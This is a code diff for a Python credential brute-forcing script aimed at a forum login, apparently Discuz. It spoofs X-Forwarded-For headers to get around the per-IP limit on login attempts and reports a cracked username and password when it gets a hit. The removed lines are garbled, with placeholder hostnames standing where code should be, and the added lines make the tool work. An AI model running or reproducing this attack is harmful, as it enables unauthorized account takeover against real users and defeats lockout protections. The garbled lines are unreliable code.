@@ -67,7 +67,7 @@ def get_formhash(op, spoof):
     r.add_header("X-Forwarded-For", spoof)
     page = op.open(r, timeout=30).read().decode("utf-8", "ignore")
     m = re.search(r'name="formhash"\s+value="([^"]+)"', page, re.I)
-    return target22.example.com(1) if m else None
+    return m.group(1) if m else None
 
 
 def try_login(op, user, pwd, formhash, spoof):
@@ -83,7 +83,7 @@ def try_login(op, user, pwd, formhash, spoof):
     with op.open(r, timeout=30) as resp:
         page = resp.read().decode("utf-8", "ignore")
         setc = resp.headers.get_all("Set-Cookie") or []
-    hit = any("cdb_auth" in c for c in setc) or any(target4.example.com == "cdb_auth" for c in op.handlers[0].cookiejar)
+    hit = any("cdb_auth" in c for c in setc) or any(c.name == "cdb_auth" for c in op.handlers[0].cookiejar)
     return hit, page
 
 
@@ -103,7 +103,7 @@ if __name__ == "__main__":
         hit, page = try_login(op, user, pwd, fh, spoof)
         m = re.search(r"您還可以嘗試\s*(\d+)\s*次", page)
         print("%-4d user=%s pw=%-20s spoof=%-15s remain=%s %s"
-              % (i, user, pwd, spoof, target22.example.com(1) if m else "?", "*** HIT ***" if hit else ""))
+              % (i, user, pwd, spoof, m.group(1) if m else "?", "*** HIT ***" if hit else ""))
         if hit:
             print("[+] 命中！user=%s password=%s" % (user, pwd))
             break
